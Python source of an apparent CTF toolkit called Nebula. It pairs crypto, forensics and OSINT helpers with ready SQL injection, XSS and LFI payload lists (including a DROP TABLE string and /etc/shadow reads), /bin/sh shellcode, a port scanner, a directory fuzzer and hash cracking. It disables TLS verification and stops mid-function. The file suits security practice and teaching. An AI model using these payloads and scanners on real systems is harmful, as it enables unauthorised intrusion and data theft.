#!/usr/bin/env python3
"""
███╗   ██╗███████╗██████╗ ██╗   ██╗██╗      █████╗
████╗  ██║██╔════╝██╔══██╗██║   ██║██║     ██╔══██╗
██╔██╗ ██║█████╗  ██████╔╝██║   ██║██║     ███████║
██║╚██╗██║██╔══╝  ██╔══██╗██║   ██║██║     ██╔══██║
██║ ╚████║███████╗██████╔╝╚██████╔╝███████╗██║  ██║
╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
           CTF Toolkit v1.0.0  |  Python Engine
"""

import sys, os, json, base64, hashlib, re, socket, struct
import threading, subprocess, shutil, math, time, signal
from pathlib import Path
from datetime import datetime
from collections import defaultdict
from typing import Optional, List, Dict, Any

VERSION = "1.0.0"

# ── ANSI Colors ──────────────────────────────────────────────────────────────

R  = "\033[91m"
G  = "\033[92m"
Y  = "\033[93m"
B  = "\033[94m"
M  = "\033[95m"
C  = "\033[96m"
W  = "\033[97m"
RESET = "\033[0m"
BOLD  = "\033[1m"

def info(msg):    print(f"{C}[*]{RESET} {msg}")
def ok(msg):      print(f"{G}[+]{RESET} {msg}")
def warn(msg):    print(f"{Y}[!]{RESET} {msg}")
def err(msg):     print(f"{R}[-]{RESET} {msg}")
def ask(msg=""):  return input(f"{M}[>]{RESET} {msg}").strip()

# ── Constants ─────────────────────────────────────────────────────────────────

HOME     = Path.home() / ".nebula"
SESSIONS = HOME / "sessions"
LOGS     = HOME / "logs"

COMMON_PORTS = [21,22,23,25,53,80,110,143,443,445,3306,3389,5432,8080,8443,6379,27017]

MORSE = {
    'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---',
    'K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-',
    'U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..',
    '0':'-----','1':'.----','2':'..---','3':'...--','4':'....-',
    '5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',
}
UNMORSE = {v: k for k, v in MORSE.items()}

ENGLISH_FREQ = {
    'E':12.7,'T':9.1,'A':8.2,'O':7.5,'I':7.0,'N':6.7,'S':6.3,'H':6.1,'R':6.0,
    'D':4.3,'L':4.0,'C':2.8,'U':2.8,'M':2.4,'W':2.4,'F':2.2,'G':2.0,'Y':2.0,
}

SQL_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "admin'--", "' OR 1=1--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "' AND SLEEP(5)--", "'; DROP TABLE users--",
    "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
]

LFI_PAYLOADS = [
    "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
    "../../../../etc/passwd", "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "php://filter/convert.base64-encode/resource=index.php",
]

DIR_WORDLIST = [
    "admin","login","dashboard","panel","backup","config","api","test","dev",
    "upload","uploads","files","static","assets","robots.txt",".htaccess",
    ".git",".env","secret","flag","flag.txt","key.txt","readme.txt","phpmyadmin",
    "wp-admin","wp-login.php","sitemap.xml","phpinfo.php","shell.php",
]

TOP_PASSWORDS = [
    "123456","password","12345678","qwerty","123456789","12345","111111",
    "dragon","master","sunshine","iloveyou","abc123","monkey","letmein",
    "admin","welcome","pass","hello","shadow","passw0rd","admin123",
]

MAGIC = {
    b'\x89PNG':      "PNG",     b'\xff\xd8\xff': "JPEG",
    b'GIF89a':       "GIF",     b'%PDF':         "PDF",
    b'PK\x03\x04':  "ZIP",     b'\x1f\x8b':     "GZIP",
    b'\x7fELF':      "ELF",     b'MZ':           "PE/EXE",
}

SHELLCODE_X86 = (b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
                 b"\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80")
SHELLCODE_X64 = (b"\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73"
                 b"\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48"
                 b"\x89\xe6\xb0\x3b\x0f\x05")

# ── Session ───────────────────────────────────────────────────────────────────

class Session:
    """Tracks flags, notes, targets, and results for a CTF session."""

    def __init__(self, name: str = ""):
        self.name     = name or f"session_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.started  = datetime.now().isoformat()
        self.flags:   List[str]        = []
        self.notes:   List[Dict]       = []
        self.targets: List[str]        = []
        self.results: Dict[str, List]  = defaultdict(list)
        HOME.mkdir(parents=True, exist_ok=True)
        SESSIONS.mkdir(parents=True, exist_ok=True)

    def flag(self, f: str):
        f = f.strip()
        if f and f not in self.flags:
            self.flags.append(f)
            ok(f"Flag saved: {G}{f}{RESET}")
        else:
            warn("Duplicate or empty flag.")

    def note(self, title: str, content: str):
        self.notes.append({"title": title, "content": content,
                           "ts": datetime.now().isoformat()})
        ok(f"Note added: {title}")

    def target(self, t: str):
        if t not in self.targets:
            self.targets.append(t)
            ok(f"Target added: {t}")

    def result(self, module: str, data: Any):
        self.results[module].append({"data": data, "ts": datetime.now().isoformat()})

    def save(self) -> str:
        path = str(SESSIONS / f"{self.name}.json")
        with open(path, "w") as f:
            json.dump({"name": self.name, "started": self.started,
                       "flags": self.flags, "notes": self.notes,
                       "targets": self.targets, "results": dict(self.results)},
                      f, indent=2, default=str)
        return path

    def load(self, path: str):
        with open(path) as f:
            d = json.load(f)
        self.name    = d.get("name", self.name)
        self.started = d.get("started", self.started)
        self.flags   = d.get("flags", [])
        self.notes   = d.get("notes", [])
        self.targets = d.get("targets", [])
        self.results = defaultdict(list, d.get("results", {}))
        ok(f"Session loaded: {path}")

    def summary(self):
        print(f"\n{BOLD}{'='*40}{RESET}")
        print(f"  {BOLD}Session:{RESET} {self.name}")
        print(f"  Targets : {len(self.targets)}")
        print(f"  Flags   : {G}{len(self.flags)}{RESET}")
        print(f"  Notes   : {len(self.notes)}")
        print(f"  Results : {sum(len(v) for v in self.results.values())}")
        print(f"{BOLD}{'='*40}{RESET}\n")

    def export_html(self, path: str):
        flags_html = "".join(f'<div class="flag">🚩 {f}</div>' for f in self.flags)
        notes_html = "".join(
            f'<div class="note"><b>{n["title"]}</b><pre>{n["content"]}</pre>'
            f'<small>{n["ts"]}</small></div>' for n in self.notes
        )
        html = f"""<!DOCTYPE html><html><head><title>Nebula Report</title>
<style>body{{font-family:monospace;background:#0d0d1a;color:#e0e0e0;padding:2rem}}
h1,h2{{color:#00d4ff}}.flag{{background:#0f3460;color:#00ff88;padding:6px 12px;
border-radius:4px;margin:4px 0}}.note{{background:#16213e;border-left:3px solid #00d4ff;
padding:10px;margin:10px 0;border-radius:0 4px 4px 0}}pre{{white-space:pre-wrap}}
small{{color:#888}}</style></head><body>
<h1>🌌 Nebula CTF Report</h1>
<p>Session: <b>{self.name}</b> &bull; Started: {self.started}</p>
<h2>Targets</h2>{''.join(f'<p>• {t}</p>' for t in self.targets)}
<h2>Flags ({len(self.flags)})</h2>{flags_html}
<h2>Notes ({len(self.notes)})</h2>{notes_html}
</body></html>"""
        with open(path, "w") as f:
            f.write(html)
        ok(f"Report saved: {path}")

# ── Crypto Tools ──────────────────────────────────────────────────────────────

class Crypto:
    """All crypto-related utilities."""

    # Caesar ──────────────────────────────────────────────

    @staticmethod
    def caesar_enc(text: str, shift: int) -> str:
        out = []
        for c in text:
            if c.isalpha():
                b = ord('A') if c.isupper() else ord('a')
                out.append(chr((ord(c) - b + shift) % 26 + b))
            else:
                out.append(c)
        return ''.join(out)

    @staticmethod
    def caesar_dec(text: str, shift: int) -> str:
        return Crypto.caesar_enc(text, -shift)

    @staticmethod
    def caesar_brute(text: str) -> List[tuple]:
        results = []
        for s in range(26):
            dec = Crypto.caesar_dec(text, s)
            upper = dec.upper()
            total = sum(1 for c in upper if c.isalpha())
            score = sum(ENGLISH_FREQ.get(c, 0) for c in upper if c.isalpha()) / max(total, 1)
            results.append((s, dec, score))
        return sorted(results, key=lambda x: x[2], reverse=True)

    # Vigenere ────────────────────────────────────────────

    @staticmethod
    def vig_enc(text: str, key: str) -> str:
        key = key.upper()
        out, ki = [], 0
        for c in text:
            if c.isalpha():
                shift = ord(key[ki % len(key)]) - ord('A')
                b = ord('A') if c.isupper() else ord('a')
                out.append(chr((ord(c) - b + shift) % 26 + b))
                ki += 1
            else:
                out.append(c)
        return ''.join(out)

    @staticmethod
    def vig_dec(text: str, key: str) -> str:
        key = key.upper()
        out, ki = [], 0
        for c in text:
            if c.isalpha():
                shift = ord(key[ki % len(key)]) - ord('A')
                b = ord('A') if c.isupper() else ord('a')
                out.append(chr((ord(c) - b - shift) % 26 + b))
                ki += 1
            else:
                out.append(c)
        return ''.join(out)

    @staticmethod
    def vig_crack(text: str, key_len: int) -> str:
        ct = ''.join(c.upper() for c in text if c.isalpha())
        key = []
        for i in range(key_len):
            group = ct[i::key_len]
            freq = defaultdict(int)
            for c in group: freq[c] += 1
            best_s, best_sc = 0, -1
            for s in range(26):
                sc = sum(ENGLISH_FREQ.get(chr((ord(c)-65-s)%26+65), 0)*n for c,n in freq.items())
                if sc > best_sc: best_sc, best_s = sc, s
            key.append(chr(best_s + 65))
        return ''.join(key)

    # XOR ─────────────────────────────────────────────────

    @staticmethod
    def xor_byte(data: bytes, key: int) -> bytes:
        return bytes([b ^ key for b in data])

    @staticmethod
    def xor_key(data: bytes, key: bytes) -> bytes:
        return bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])

    @staticmethod
    def xor_brute(data: bytes) -> List[tuple]:
        results = []
        for k in range(256):
            dec = Crypto.xor_byte(data, k)
            text = dec.decode('utf-8', errors='ignore')
            score = sum(ENGLISH_FREQ.get(c.upper(), 0) for c in text if c.isalpha())
            results.append((k, dec, score))
        return sorted(results, key=lambda x: x[2], reverse=True)

    # RSA ─────────────────────────────────────────────────

    @staticmethod
    def ext_gcd(a: int, b: int):
        if a == 0: return b, 0, 1
        g, x, y = Crypto.ext_gcd(b % a, a)
        return g, y - (b // a) * x, x

    @staticmethod
    def mod_inv(e: int, phi: int) -> Optional[int]:
        g, x, _ = Crypto.ext_gcd(e % phi, phi)
        return x % phi if g == 1 else None

    @staticmethod
    def rsa_dec(c: int, d: int, n: int) -> int:
        return pow(c, d, n)

    @staticmethod
    def rsa_keygen(p: int, q: int, e: int):
        n = p * q
        phi = (p-1) * (q-1)
        d = Crypto.mod_inv(e, phi)
        return {"n": n, "e": e, "d": d, "phi": phi}

    @staticmethod
    def factorize(n: int):
        if n % 2 == 0: return 2, n//2
        i = 3
        while i*i <= n:
            if n % i == 0: return i, n//i
            i += 2
        return None

    # Encoding ────────────────────────────────────────────

    @staticmethod
    def b64_enc(data) -> str:
        if isinstance(data, str): data = data.encode()
        return base64.b64encode(data).decode()

    @staticmethod
    def b64_dec(data: str) -> bytes:
        pad = 4 - len(data) % 4
        if pad != 4: data += '=' * pad
        return base64.b64decode(data)

    @staticmethod
    def b32_enc(data) -> str:
        if isinstance(data, str): data = data.encode()
        return base64.b32encode(data).decode()

    @staticmethod
    def b32_dec(data: str) -> bytes:
        return base64.b32decode(data + '=' * (-len(data) % 8))

    @staticmethod
    def hex_enc(data) -> str:
        if isinstance(data, str): data = data.encode()
        return data.hex()

    @staticmethod
    def hex_dec(data: str) -> bytes:
        return bytes.fromhex(data)

    @staticmethod
    def rot13(text: str) -> str:
        return Crypto.caesar_enc(text, 13)

    @staticmethod
    def atbash(text: str) -> str:
        out = []
        for c in text:
            if c.isalpha():
                b = ord('A') if c.isupper() else ord('a')
                out.append(chr(b + 25 - (ord(c) - b)))
            else:
                out.append(c)
        return ''.join(out)

    @staticmethod
    def morse_enc(text: str) -> str:
        return ' '.join('/' if c == ' ' else MORSE.get(c.upper(), '?') for c in text)

    @staticmethod
    def morse_dec(code: str) -> str:
        return ' '.join(''.join(UNMORSE.get(c, '?') for c in word.split())
                        for word in code.split(' / '))

    @staticmethod
    def bin_to_text(b: str) -> str:
        b = b.replace(' ', '')
        return ''.join(chr(int(b[i:i+8], 2)) for i in range(0, len(b)-7, 8))

    @staticmethod
    def text_to_bin(t: str) -> str:
        return ' '.join(format(ord(c), '08b') for c in t)

    @staticmethod
    def auto_decode(data: str) -> dict:
        results = {}
        for name, fn in [
            ("rot13",  lambda d: Crypto.rot13(d)),
            ("base64", lambda d: Crypto.b64_dec(d).decode('utf-8', errors='replace')),
            ("hex",    lambda d: Crypto.hex_dec(d).decode('utf-8', errors='replace')
                       if re.match(r'^[0-9a-fA-F]+$', d) and len(d)%2==0 else (_ for _ in ()).throw(ValueError())),
        ]:
            try:
                r = fn(data)
                if r: results[name] = r
            except Exception:
                pass
        return results

    # Hash ────────────────────────────────────────────────

    @staticmethod
    def hash_data(data, algo="md5") -> str:
        if isinstance(data, str): data = data.encode()
        return hashlib.new(algo, data).hexdigest()

    @staticmethod
    def hash_all(data) -> dict:
        if isinstance(data, str): data = data.encode()
        return {a: hashlib.new(a, data).hexdigest() for a in ["md5","sha1","sha256","sha512"]}

    @staticmethod
    def hash_identify(h: str) -> List[str]:
        patterns = {
            "md5":    r"^[a-fA-F0-9]{32}$",
            "sha1":   r"^[a-fA-F0-9]{40}$",
            "sha256": r"^[a-fA-F0-9]{64}$",
            "sha512": r"^[a-fA-F0-9]{128}$",
            "bcrypt": r"^\$2[ayb]\$.{56}$",
            "crc32":  r"^[a-fA-F0-9]{8}$",
        }
        return [t for t, p in patterns.items() if re.match(p, h)]

    @staticmethod
    def hash_crack(h: str, algo="md5", wordlist=None) -> Optional[str]:
        if wordlist is None: wordlist = TOP_PASSWORDS
        for word in wordlist:
            if Crypto.hash_data(word, algo) == h.lower():
                return word
        return None

# ── Forensics Tools ───────────────────────────────────────────────────────────

class Forensics:
    """File analysis and forensics utilities."""

    @staticmethod
    def identify(path: str) -> dict:
        r = {"path": path, "type": "unknown", "entropy": 0.0}
        try:
            stat = Path(path).stat()
            r["size"] = stat.st_size
            r["size_human"] = Forensics.human_size(stat.st_size)
            with open(path, 'rb') as f:
                header = f.read(16)
            r["header"] = header.hex()
            for magic, ftype in MAGIC.items():
                if header.startswith(magic):
                    r["type"] = ftype
                    break
            with open(path, 'rb') as f:
                r["entropy"] = Forensics.entropy(f.read())
        except Exception as e:
            r["error"] = str(e)
        return r

    @staticmethod
    def entropy(data: bytes) -> float:
        if not data: return 0.0
        counts = [0]*256
        for b in data: counts[b] += 1
        total = len(data)
        return round(-sum(c/total * math.log2(c/total) for c in counts if c), 4)

    @staticmethod
    def strings(path: str, min_len=4) -> List[str]:
        found, current = [], []
        try:
            with open(path, 'rb') as f:
                for byte in f.read():
                    if 32 <= byte <= 126:
                        current.append(chr(byte))
                    elif len(current) >= min_len:
                        found.append(''.join(current)); current = []
                    else:
                        current = []
            if len(current) >= min_len:
                found.append(''.join(current))
        except Exception as e:
            err(f"Strings error: {e}")
        return found

    @staticmethod
    def hidden(path: str) -> dict:
        results = {"findings": []}
        try:
            with open(path, 'rb') as f:
                data = f.read()
            for magic, ftype in MAGIC.items():
                offset = data.find(magic, len(magic))
                while offset > 0:
                    results["findings"].append({"type": "embedded", "file": ftype, "offset": hex(offset)})
                    offset = data.find(magic, offset + 1)
            for m in re.finditer(rb'https?://[^\s\x00-\x1f\x7f-\xff]{5,100}', data):
                results["findings"].append({"type": "url", "value": m.group().decode(errors='ignore'), "offset": hex(m.start())})
            for m in re.finditer(rb'[A-Za-z0-9+/]{20,}={0,2}', data):
                try:
                    dec = base64.b64decode(m.group())
                    if len(dec) > 8:
                        results["findings"].append({"type": "base64", "offset": hex(m.start()), "len": len(m.group())})
                except Exception:
                    pass
        except Exception as e:
            results["error"] = str(e)
        return results

    @staticmethod
    def metadata(path: str) -> dict:
        meta = {}
        try:
            stat = Path(path).stat()
            meta = {
                "size": stat.st_size,
                "modified": datetime.fromtimestamp(stat.st_mtime).isoformat(),
                "created":  datetime.fromtimestamp(stat.st_ctime).isoformat(),
                "permissions": oct(stat.st_mode),
            }
        except Exception as e:
            meta["error"] = str(e)
        return meta

    @staticmethod
    def carve(path: str, out_dir: str = "carved") -> List[str]:
        Path(out_dir).mkdir(parents=True, exist_ok=True)
        carved = []
        with open(path, 'rb') as f:
            data = f.read()
        targets = {
            b'\x89PNG\r\n\x1a\n': ('png', b'IEND\xaeB`\x82'),
            b'\xff\xd8\xff':       ('jpg', b'\xff\xd9'),
            b'%PDF':               ('pdf', b'%%EOF'),
        }
        for magic, (ext, footer) in targets.items():
            start = 0
            while True:
                offset = data.find(magic, start)
                if offset == -1: break
                end = data.find(footer, offset + len(magic))
                if end != -1:
                    fn = Path(out_dir) / f"carved_{offset}.{ext}"
                    with open(fn, 'wb') as f:
                        f.write(data[offset:end + len(footer)])
                    carved.append(str(fn))
                start = offset + 1
        return carved

    @staticmethod
    def lsb_extract(image_path: str) -> Optional[bytes]:
        try:
            from PIL import Image
            img = Image.open(image_path)
            bits = []
            for pixel in img.getdata():
                channels = pixel[:3] if isinstance(pixel, tuple) else [pixel]
                for ch in channels:
                    bits.append(ch & 1)
            return bytes(sum(bits[i+j] << j for j in range(8)) for i in range(0, len(bits)-7, 8))
        except ImportError:
            warn("PIL not installed. Run: pip install Pillow")
            return None
        except Exception as e:
            err(f"LSB error: {e}")
            return None

    @staticmethod
    def human_size(size: int) -> str:
        for unit in ['B','KB','MB','GB']:
            if size < 1024: return f"{size:.1f} {unit}"
            size //= 1024
        return f"{size:.1f} TB"

# ── Network / Web Tools ───────────────────────────────────────────────────────

class Net:
    """Network scanning and web exploitation utilities."""

    def __init__(self, timeout=5):
        self.timeout = timeout
        self.headers = {"User-Agent": "Nebula/1.0 CTF-Toolkit"}

    def request(self, url: str, method="GET", data=None, extra_headers=None) -> dict:
        try:
            import urllib.request, urllib.parse, ssl
            h = {**self.headers, **(extra_headers or {})}
            body = urllib.parse.urlencode(data).encode() if data else None
            req = urllib.request.Request(url, data=body, headers=h, method=method)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, timeout=self.timeout, context=ctx) as resp:
                raw = resp.read()
                return {"status": resp.status, "headers": dict(resp.headers),
                        "body": raw.decode('utf-8', errors='replace'), "length": len(raw)}
        except Exception as e:
            return {"status": 0, "error": str(e)}

    def port_scan(self, host: str, ports=None) -> dict:
        ports = ports or COMMON_PORTS
        results = {}
        lock = threading.Lock()
        def scan(port):
            try:
                s = socket.socket()
                s.settimeout(self.timeout)
                if s.connect_ex((host, port)) == 0:
                    svc = {21:"FTP",22:"SSH",23:"Telnet",25:"SMTP",53:"DNS",80:"HTTP",
                           443:"HTTPS",445:"SMB",3306:"MySQL",3389:"RDP",5432:"PgSQL",
                           8080:"HTTP-Alt",6379:"Redis",27017:"MongoDB"}.get(port, "unknown")
                    with lock: results[port] = svc
                s.close()
            except Exception: pass
        threads = [threading.Thread(target=scan, args=(p,)) for p in ports]
        for t in threads: t.start()
        for t in threads: t.join()
        return results

    def sqli_test(self, url: str, param="id") -> List[dict]:
        import urllib.parse
        found = []
        base_len = self.request(url).get("length", 0)
        info(f"SQLi scanning: {url} [{param}]")
        for payload in SQL_PAYLOADS:
            test = f"{url}?{param}={urllib.parse.quote(payload)}"
            resp = self.request(test)
            body = resp.get("body", "")
            indicators = [kw for kw in ["sql","mysql","syntax error","ora-","pg_query","sqlite"] if kw in body.lower()]
            if resp.get("length", 0) != base_len:
                indicators.append(f"length_delta:{resp.get('length',0)-base_len}")
            if indicators:
                found.append({"payload": payload, "indicators": indicators})
                ok(f"SQLi hit: {payload[:40]}")
        return found

    def xss_test(self, url: str, param="q") -> List[dict]:
        import urllib.parse
        found = []
        info(f"XSS scanning: {url} [{param}]")
        for payload in XSS_PAYLOADS:
            test = f"{url}?{param}={urllib.parse.quote(payload)}"
            resp = self.request(test)
            if payload in resp.get("body", ""):
                found.append({"payload": payload})
                ok(f"XSS reflected: {payload[:40]}")
        return found

    def lfi_test(self, url: str, param="file") -> List[dict]:
        import urllib.parse
        found = []
        info(f"LFI scanning: {url} [{param}]")
        for payload in LFI_PAYLOADS:
            test = f"{url}?{param}={urllib.parse.quote(payload)}"
            resp = self.request(test)
            body = resp.get("body", "")
            if any(ind in body for ind in ["root:x:", "root:", "/bin/bash", "/bin/sh"]):
                found.append({"payload": payload})
                ok(f"LFI hit: {payload}")
        return found

    def dir_fuzz(self, base_url: str, wordlist=None) -> List[dict]:
        base_url = base_url.rstrip('/')
        wl = wordlist or DIR_WORDLIST
        found = []
        info(f"Dir fuzzing: {base_url} ({len(wl)} words)")
        for word in wl:
            resp = self.request(f"{base_url}/{word}")
            status = resp.get("status", 0)
            if status in [200, 201, 301, 302, 403]:
                entry = {"path": word, "status": status, "length": resp.get("length", 0)}
                found.append(entry)
                sc = G if status == 200 else Y
                print(f"  [{sc}{status}{RESET}] /{word} ({resp.get('length',0)}B)")
        return found

    def header_check(self, url: str) -> dict:
        resp = self.request(url)
        hdrs = resp.get("headers", {})
        sec = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
               "X-Content-Type-Options","Referrer-Policy"]
        hl = {k.lower(): v for k, v in hdrs.items()}
        return {
            "server":  hdrs.get("Server", "hidden"),
            "present": [h for h in sec if h.lower() in hl],
            "missing": [h for h in sec if h.lower() not in hl],
        }

    def dns_lookup(self, domain: str) -> dict:
        try:
            result = socket.gethostbyname_ex(domain)
            return {"domain": domain, "ips": result[2], "aliases": result[1]}
        except Exception as e:
            return {"domain": domain, "error": str(e)}

    def subdomain_enum(self, domain: str, wordlist=None) -> List[str]:
        wl = wordlist or ["www","mail","ftp","admin","api","dev","test","staging","vpn","blog","shop"]
        found = []
        info(f"Subdomain enum: {domain}")
        for sub in wl:
            fqdn = f"{sub}.{domain}"
            try:
                socket.gethostbyname(fqdn)
                found.append(fqdn)
                ok(f"Found: {fqdn}")
            except socket.gaierror:
                pass
        return found

# ── Pwn Tools ─────────────────────────────────────────────────────────────────

class Pwn:
    """Binary exploitation utilities."""

    @staticmethod
    def cyclic(length: int, alpha=b"abcdefghijklmnopqrstuvwxyz") -> bytes:
        return bytes(alpha[i % len(alpha)] for i in range(length))

    @staticmethod
    def offset(crash_val, length=500) -> int:
        if isinstance(crash_val, str):  crash_val = crash_val.encode()
        if isinstance(crash_val, int):  crash_val = struct.pack("<I", crash_val)
        pat = Pwn.cyclic(length)
        try:    return pat.index(crash_val)
        except ValueError:
            try: return pat.index(crash_val[::-1])
            except ValueError: return -1

    @staticmethod
    def pack32(v: int, endian="little") -> bytes:
        return struct.pack("<I" if endian == "little" else ">I", v)

    @staticmethod
    def pack64(v: int, endian="little") -> bytes:
        return struct.pack("<Q" if endian == "little" else ">Q", v)

    @staticmethod
    def unpack32(data: bytes, endian="little") -> int:
        return struct.unpack("<I" if endian == "little" else ">I", data[:4])[0]

    @staticmethod
    def unpack64(data: bytes, endian="little") -> int:
        return struct.unpack("<Q" if endian == "little" else ">Q", data[:8])[0]

    @staticmethod
    def nop_sled(n: int) -> bytes:
        return b'\x90' * n

    @staticmethod
    def shellcode(arch="x86") -> bytes:
        return SHELLCODE_X86 if arch == "x86" else SHELLCODE_X64

    @staticmethod
    def bad_chars(sc: bytes, bad: bytes) -> List[int]:
        return [i for i, b in enumerate(sc) if b in bad]

    @staticmethod
    def fmt_probes(n=20, prefix="AAAA") -> List[str]:
        return [f"{prefix}%{i}$p" for i in range(1, n+1)]

    @staticmethod
    def analyze_elf(path: str) -> dict:
        r = {"path": path}
        try:
            with open(path, 'rb') as f: data = f.read()
            if not data.startswith(b'\x7fELF'):
                return {"error": "Not an ELF"}
            r["bits"]   = "64" if data[4] == 2 else "32"
            r["endian"] = "little" if data[5] == 1 else "big"
            etype = struct.unpack_from("<H", data, 16)[0]
            r["type"]   = {1:"REL",2:"EXEC",3:"DYN",4:"CORE"}.get(etype, "unknown")
            r["canary"] = b"__stack_chk_fail" in data
            r["pie"]    = etype == 3
            strs = Forensics.strings(path, 6)
            r["interesting"] = [s for s in strs if any(
                kw in s.lower() for kw in ["flag","ctf","key","password","/bin/sh","system"])]
        except Exception as e:
            r["error"] = str(e)
        return r

# ── OSINT Tools ───────────────────────────────────────────────────────────────

class OSINT:
    """Open-source intelligence utilities."""

    def __init__(self):
        self.net = Net()

    def username_search(self, username: str) -> dict:
        platforms = {
            "GitHub":     f"https://github.com/{username}",
            "GitLab":     f"https://gitlab.com/{username}",
            "Dev.to":     f"https://dev.to/{username}",
            "KeyBase":    f"https://keybase.io/{username}",
            "HackerNews": f"https://news.ycombinator.com/user?id={username}",
            "Pastebin":   f"https://pastebin.com/u/{username}",
        }
        info(f"Searching username: {username}")
        results = {}
        for platform, url in platforms.items():
            status = self.net.request(url).get("status", 0)
            results[platform] = "FOUND" if status == 200 else f"status:{status}"
            if status == 200:
                ok(f"[{platform}] {url}")
        return results

    def email_perms(self, first: str, last: str, domain: str) -> List[str]:
        f, l = first.lower(), last.lower()
        return [
            f"{f}@{domain}", f"{l}@{domain}", f"{f}.{l}@{domain}", f"{f}{l}@{domain}",
            f"{f[0]}{l}@{domain}", f"{f}{l[0]}@{domain}", f"{l}.{f}@{domain}",
            f"{l}{f[0]}@{domain}", f"{f}_{l}@{domain}", f"{f}-{l}@{domain}",
        ]

    def dorks(self, target: str) -> List[str]:
        return [
            f'site:{target}',
            f'site:{target} filetype:pdf',
            f'site:{target} filetype:sql',
            f'site:{target} intitle:"index of"',
            f'site:{target} inurl:admin',
            f'site:{target} inurl:login',
            f'site:{target} intext:password',
            f'site:{target} intext:api_key',
            f'site:{target} ext:log',
            f'site:{target} ext:bak',
            f'"{target}" site:pastebin.com',
            f'"{target}" site:github.com',
        ]

    def page_recon(self, url: str) -> dict:
        resp = self.net.request(url)
        body = resp.get("body", "")
        hdrs = resp.get("headers", {})
        return {
            "server":    hdrs.get("Server", "unknown"),
            "emails":    list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', body)))[:10],
            "socials":   list(set(re.findall(r'(?:twitter|github|linkedin)\.com/[a-zA-Z0-9_/-]+', body)))[:10],
        }

# ── Interactive Shell ─────────────────────────────────────────────────────────

HELP = f"""
{BOLD}{'─'*50}{RESET}
  {C}NEBULA CTF SHELL{RESET}  —  Available Commands
{'─'*50}
  {G}GENERAL{RESET}
    help / ?          Show this menu
    version           Show version
    banner            Show banner
    clear             Clear screen
    exit / quit       Save & exit

  {G}SESSION{RESET}
    session           Show session summary
    flag <value>      Record a flag
    note <title>      Add a note
    target <host>     Add a target
    save              Save session
    export            Export HTML report

  {G}MODULES{RESET}
    web               Web exploitation module
    crypto            Cryptography module
    forensics         Forensics module
    pwn               Pwn / binary exploitation
    osint             OSINT module
    scan <host>       Quick port scan
    fuzz <url>        Directory fuzz a URL
    sqli <url>        SQL injection test
    xss  <url>        XSS test

  {G}QUICK TOOLS{RESET}
    encode <type> <data>   base64/hex/rot13/morse/binary
    decode <type> <data>   Same types + auto
    hash   <algo> <data>   md5/sha1/sha256/sha512/all
    identify <hash>        Identify hash type
    caesar <text>          Brute-force Caesar
{'─'*50}
"""

BANNER_ART = f"""{M}
  ███╗   ██╗███████╗██████╗ ██╗   ██╗██╗      █████╗
  ████╗  ██║██╔════╝██╔══██╗██║   ██║██║     ██╔══██╗
  ██╔██╗ ██║█████╗  ██████╔╝██║   ██║██║     ███████║
  ██║╚██╗██║██╔══╝  ██╔══██╗██║   ██║██║     ██╔══██║
  ██║ ╚████║███████╗██████╔╝╚██████╔╝███████╗██║  ██║
  ╚═╝  ╚═══╝╚══════╝╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝
{RESET}{C}             CTF Toolkit v{VERSION}  |  Python + Java{RESET}
"""


class Shell:
    """Main interactive shell."""

    def __init__(self):
        self.session = Session()
        self.net     = Net()
        self.running = True

    def start(self):
        print(BANNER_ART)
        info("Type 'help' for commands.\n")
        signal.signal(signal.SIGINT, self._handle_int)
        while self.running:
            try:
                cmd = input(f"{M}nebula{RESET}{B}>{RESET} ").strip()
                if cmd:
                    self._run(cmd)
            except EOFError:
                break

    def _handle_int(self, sig, frame):
        print()
        info("Use 'exit' to quit gracefully.")

    def _run(self, raw: str):
        parts = raw.split(None, 2)
        cmd = parts[0].lower()
        args = parts[1:]

        dispatch = {
            "help": self._help,       "?": self._help,
            "version": self._version, "banner": self._banner,
            "clear": self._clear,     "exit": self._exit,
            "quit": self._exit,       "session": self._session,
            "flag": self._flag,       "note": self._note,
            "target": self._target,   "save": self._save,
            "export": self._export,   "web": self._web_module,
            "crypto": self._crypto_module,
            "forensics": self._forensics_module,
            "pwn": self._pwn_module,  "osint": self._osint_module,
            "scan": self._scan,       "fuzz": self._fuzz,
            "sqli": self._sqli,       "xss": self._xss,
            "encode": self._encode,   "decode": self._decode,
            "hash": self._hash,       "identify": self._identify,
            "caesar": self._caesar,
        }
        fn = dispatch.get(cmd)
        if fn:
            try: fn(args)
            except Exception as e: err(f"Error: {e}")
        else:
            err(f"Unknown command: {cmd}. Type 'help'.")

    def _help(self, _):    print(HELP)
    def _version(self, _): print(f"\n  Nebula CTF Toolkit v{VERSION}\n")
    def _banner(self, _):  print(BANNER_ART)
    def _clear(self, _):   os.system("clear" if os.name != "nt" else "cls")
    def _session(self, _): self.session.summary()

    def _exit(self, _):
        info("Saving session...")
